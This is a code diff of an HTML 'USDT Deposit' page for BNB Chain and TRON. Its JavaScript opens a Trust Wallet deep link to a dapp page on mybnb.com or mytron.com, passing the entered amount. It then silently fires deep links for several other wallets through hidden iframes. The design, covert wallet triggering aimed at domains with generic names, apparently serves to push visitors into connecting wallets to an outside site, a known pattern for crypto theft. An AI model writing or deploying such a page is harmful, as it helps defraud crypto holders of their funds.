@@ -3,105 +3,144 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Deposit & Priority Wallet Launch</title>
+  <title>USDT Luxury Deposit Portal</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+
     * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      font-family: 'Plus Jakarta Sans', sans-serif;
     }
 
-    body {
-      background: #050508;
-      background-image: radial-gradient(circle at 50% 0%, #1e1035 0%, #050508 70%);
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
+    /* Ambient Glow Animations */
+    .glow-bg {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(120px);
+      opacity: 0.45;
+      z-index: 0;
+      pointer-events: none;
+      animation: pulseGlow 8s infinite alternate ease-in-out;
     }
 
-    .card {
-      width: 100%;
-      max-width: 420px;
-      background: rgba(18, 16, 26, 0.75);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
+    @keyframes pulseGlow {
+      0% { transform: scale(1) translate(0, 0); opacity: 0.35; }
+      100% { transform: scale(1.15) translate(20px, -20px); opacity: 0.55; }
+    }
+
+    /* Animated Gradient Border Card */
+    .gradient-card-border {
+      position: relative;
+      background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.02));
       border-radius: 24px;
-      padding: 32px 24px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 40px rgba(98, 32, 251, 0.15);
-      text-align: center;
+      padding: 1px;
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 50px rgba(98, 32, 251, 0.2);
     }
 
-    .title {
-      font-size: 1.6rem;
-      font-weight: 700;
-      background: linear-gradient(135deg, #ffffff 0%, #a5a5a5 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 24px;
+    .gradient-card-border::before {
+      content: '';
+      position: absolute;
+      inset: -1px;
+      border-radius: 25px;
+      padding: 1px;
+      background: linear-gradient(135deg, #10b981, #3b82f6, #8b5cf6, #ec4899);
+      background-size: 300% 300%;
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      animation: borderRotate 6s ease infinite;
+      pointer-events: none;
     }
 
-    .input-group {
-      margin-bottom: 24px;
-      text-align: left;
+    @keyframes borderRotate {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
 
-    .input-label {
-      font-size: 0.8rem;
-      color: #8a8a9e;
-      margin-bottom: 8px;
+    /* Stacked Icons Styling */
+    .icon-wrapper {
+      position: relative;
+      width: 88px;
+      height: 88px;
+      margin: 0 auto 16px auto;
+    }
+
+    .usdt-icon {
+      width: 88px;
+      height: 88px;
+      border-radius: 50%;
+      object-fit: cover;
       display: block;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
+      box-shadow: 0 8px 25px rgba(38, 161, 123, 0.35);
+      border: 2px solid rgba(255, 255, 255, 0.1);
     }
 
-    .amount-input {
-      width: 100%;
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+    .network-badge {
+      position: absolute;
+      bottom: -2px;
+      right: -2px;
+      width: 32px;
+      height: 32px;
+      background-color: #0d111a;
       border-radius: 10px;
-      padding: 14px 16px;
-      color: #fff;
-      font-size: 1.2rem;
-      outline: none;
-      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 3px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.6);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
     }
 
-    .amount-input:focus {
-      border-color: #6220fb;
-      box-shadow: 0 0 15px rgba(98, 32, 251, 0.3);
+    .network-badge img {
+      width: 24px;
+      height: 24px;
+      border-radius: 7px;
+      object-fit: cover;
     }
 
-    /* Custom Luxury Button Style */
+    /* Custom Luxury Clip-Path Button Style */
     .custom-btn {
       width: 100%;
       border-radius: .25rem;
       text-transform: uppercase;
       font-style: normal;
-      font-weight: 600;
+      font-weight: 700;
       padding-left: 25px;
       padding-right: 25px;
       color: #fff;
       -webkit-clip-path: polygon(0 0,0 0,100% 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,15px 100%,0 100%);
       clip-path: polygon(0 0,0 0,100% 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,15px 100%,0 100%);
-      height: 48px;
-      font-size: 0.8rem;
-      line-height: 48px;
-      letter-spacing: 1.5px;
-      transition: .2s .1s;
-      background-image: linear-gradient(90deg,#1c1c1c,#6220fb);
+      height: 52px;
+      font-size: 0.85rem;
+      line-height: 52px;
+      letter-spacing: 1.8px;
+      transition: all 0.3s ease;
+      background: linear-gradient(90deg, #111827 0%, #6220fb 50%, #8b5cf6 100%);
+      background-size: 200% auto;
       border: 0 solid;
       overflow: hidden;
       cursor: pointer;
+      box-shadow: 0 10px 30px rgba(98, 32, 251, 0.4);
     }
 
     .custom-btn:hover {
-      transition: all .3s ease-in;
+      background-position: right center;
       filter: brightness(1.2);
+      box-shadow: 0 15px 35px rgba(98, 32, 251, 0.6);
+      transform: translateY(-1px);
+    }
+
+    .custom-btn:active {
+      transform: translateY(1px);
+    }
+
+    /* Custom Input Focus Glow */
+    .amount-field:focus-within {
+      border-color: #8b5cf6;
+      box-shadow: 0 0 20px rgba(139, 92, 246, 0.35);
     }
 
     .hidden-iframe {
@@ -109,35 +148,141 @@
     }
   </style>
 </head>
-<body>
+<body class="bg-[#05050a] text-white min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
 
-  <div class="card">
-    <h1 class="title">Deposit Funds</h1>
+  <!-- Ambient Background Lights -->
+  <div class="glow-bg w-[350px] h-[350px] bg-purple-600 -top-10 -left-10"></div>
+  <div class="glow-bg w-[300px] h-[300px] bg-blue-600 -bottom-10 -right-10"></div>
+  <div class="glow-bg w-[250px] h-[250px] bg-emerald-500 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 opacity-20"></div>
 
-    <div class="input-group">
-      <label class="input-label" for="amount">Enter Amount want to deposit</label>
-      <input type="number" id="amount" class="amount-input" placeholder="0.00" step="any">
+  <!-- Main Container Card -->
+  <div class="gradient-card-border w-full max-w-md z-10">
+    <div class="bg-[#0b0c14]/90 backdrop-blur-2xl rounded-[23px] p-6 sm:p-8 text-center relative overflow-hidden">
+      
+      <!-- Top Decorative Pill -->
+      <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/5 border border-white/10 text-[11px] font-medium text-gray-300 mb-6 backdrop-blur-md">
+        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+        Instant Web3 Deposit
+      </div>
+
+      <!-- Stacked Icons Container -->
+      <div class="icon-wrapper">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
+        <div class="network-badge" id="badge-wrapper">
+          <img id="badge-icon" src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="Network Badge">
+        </div>
+      </div>
+
+      <!-- Heading -->
+      <h2 class="text-2xl font-extrabold text-white tracking-tight mb-1">USDT Deposit</h2>
+      <p class="text-xs text-gray-400 mb-6">Choose network & enter amount to process</p>
+
+      <!-- Amount Input Container -->
+      <div class="text-left mb-5">
+        <div class="flex justify-between items-center mb-1.5">
+          <label class="text-[11px] font-bold text-gray-400 uppercase tracking-wider">Deposit Amount</label>
+          <span class="text-[11px] text-purple-400 font-semibold">Min $5.00</span>
+        </div>
+        
+        <div class="amount-field relative flex items-center bg-black/40 border border-white/10 rounded-xl px-4 py-3 transition-all duration-300">
+          <span class="text-xl font-bold text-gray-400 mr-2">$</span>
+          <input type="number" id="amount" value="5" placeholder="0.00" step="any" class="w-full bg-transparent text-xl font-bold text-white focus:outline-none placeholder-gray-600">
+          <span class="text-xs font-bold text-gray-400 bg-white/10 px-2.5 py-1 rounded-md ml-2">USDT</span>
+        </div>
+      </div>
+
+      <!-- Network Selection Radio Cards -->
+      <div class="text-left mb-8">
+        <label class="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-2">Select Network</label>
+        
+        <div class="grid grid-cols-2 gap-3">
+          
+          <!-- BNB BEP20 Option -->
+          <label class="cursor-pointer group">
+            <input type="radio" name="network" value="bnb" checked onchange="updateNetworkBadge('bnb')" class="peer hidden">
+            <div class="relative bg-white/[0.03] border border-white/10 rounded-xl p-3.5 flex items-center gap-3 transition-all duration-300 peer-checked:border-purple-500 peer-checked:bg-purple-600/10 peer-checked:shadow-[0_0_15px_rgba(139,92,246,0.25)] group-hover:bg-white/[0.06]">
+              <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" class="w-7 h-7 rounded-lg object-cover" alt="BNB">
+              <div>
+                <span class="block text-xs font-bold text-white group-hover:text-purple-300 transition">BEP20</span>
+                <span class="block text-[10px] text-gray-400">BNB Chain</span>
+              </div>
+            </div>
+          </label>
+
+          <!-- Tron TRC20 Option -->
+          <label class="cursor-pointer group">
+            <input type="radio" name="network" value="tron" onchange="updateNetworkBadge('tron')" class="peer hidden">
+            <div class="relative bg-white/[0.03] border border-white/10 rounded-xl p-3.5 flex items-center gap-3 transition-all duration-300 peer-checked:border-purple-500 peer-checked:bg-purple-600/10 peer-checked:shadow-[0_0_15px_rgba(139,92,246,0.25)] group-hover:bg-white/[0.06]">
+              <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" class="w-7 h-7 rounded-lg object-cover" alt="TRON">
+              <div>
+                <span class="block text-xs font-bold text-white group-hover:text-purple-300 transition">TRC20</span>
+                <span class="block text-[10px] text-gray-400">TRON Network</span>
+              </div>
+            </div>
+          </label>
+
+        </div>
+      </div>
+
+      <!-- Primary Deposit Trigger Button -->
+      <button class="custom-btn" onclick="executeWalletDeposit()">Deposit Now</button>
+
+      <!-- Trust Wallet Priority Indicator -->
+      <p class="text-[10px] text-gray-500 mt-4 flex items-center justify-center gap-1.5">
+        <svg class="w-3.5 h-3.5 text-emerald-400" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+        </svg>
+        Priority: Trust Wallet & Custom Scheme Fallback
+      </p>
+
     </div>
-
-    <button class="custom-btn" onclick="triggerPriorityWallets()">Deposit</button>
   </div>
 
-  <!-- Hidden container for fallback iframe triggers -->
+  <!-- Hidden Container for Secondary Wallet Triggers -->
   <div id="iframe-container" class="hidden-iframe"></div>
 
   <script>
-    function triggerPriorityWallets() {
-      const amountInput = document.getElementById('amount').value || '0.00';
-      const baseUrl = 'https://deepak-astrology.vercel.app/';
+    // Network Icon Image Links
+    const bnbBadgeUrl = "https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png";
+    const trcBadgeUrl = "https://cdn-icons-png.flaticon.com/512/12114/12114250.png";
+
+    // Dynamic Network Badge Icon Switcher
+    function updateNetworkBadge(type) {
+      const badgeImg = document.getElementById('badge-icon');
+      const badgeWrapper = document.getElementById('badge-wrapper');
       
-      // Target URL with ?amount= parameter
-      const targetUrlWithAmount = baseUrl + '?amount=' + encodeURIComponent(amountInput);
+      // Scale animation effect
+      badgeWrapper.style.transform = 'scale(0.5)';
+      
+      setTimeout(() => {
+        if (type === 'tron') {
+          badgeImg.src = trcBadgeUrl;
+        } else {
+          badgeImg.src = bnbBadgeUrl;
+        }
+        badgeWrapper.style.transform = 'scale(1)';
+      }, 150);
+    }
+
+    // Trigger Multi-Wallet Deposit Logic
+    function executeWalletDeposit() {
+      const amountVal = document.getElementById('amount').value || '5';
+      const selectedNetwork = document.querySelector('input[name="network"]:checked').value;
+      
+      // Selected Domain Logic
+      let selectedDomain = 'mybnb.com';
+      if (selectedNetwork === 'tron') {
+        selectedDomain = 'mytron.com';
+      }
+
+      // Final Target URL with Amount Parameter
+      const targetUrlWithAmount = 'https://' + selectedDomain + '/?amount=' + encodeURIComponent(amountVal);
       const encodedTargetUrl = encodeURIComponent(targetUrlWithAmount);
 
-      // 1. PRIORITY #1: Trust Wallet URL Scheme
+      // Priority #1 Target: Trust Wallet Scheme
       const trustWalletScheme = 'trust://open_url?coin_id=60&url=' + encodedTargetUrl;
 
-      // 2. FALLBACK WALLETS (Secondary Priority Order)
+      // Secondary Fallback Wallet Schemes
       const fallbackSchemes = [
         'metamask://dapp/' + targetUrlWithAmount.replace(/^https?:\/\//, ''),
         'okx://wallet/dapp/details?dappUrl=' + encodedTargetUrl,
@@ -146,13 +291,13 @@
         'rainbow://open?url=' + encodedTargetUrl
       ];
 
-      // Step A: Primary action - Directly execute Trust Wallet first
+      // 1. Direct Trigger for Priority #1 Wallet (Trust Wallet)
       window.location.href = trustWalletScheme;
 
-      // Step B: Secondary action - Trigger backup wallets after a tiny delay
+      // 2. Micro-delay fallback trigger for other wallets
       setTimeout(() => {
         const container = document.getElementById('iframe-container');
-        container.innerHTML = ''; // Reset container
+        container.innerHTML = '';
 
         fallbackSchemes.forEach((scheme, index) => {
           setTimeout(() => {
@@ -162,7 +307,7 @@
             container.appendChild(iframe);
           }, index * 100);
         });
-      }, 150); // 150ms priority gap for Trust Wallet
+      }, 150);
     }
   </script>
 
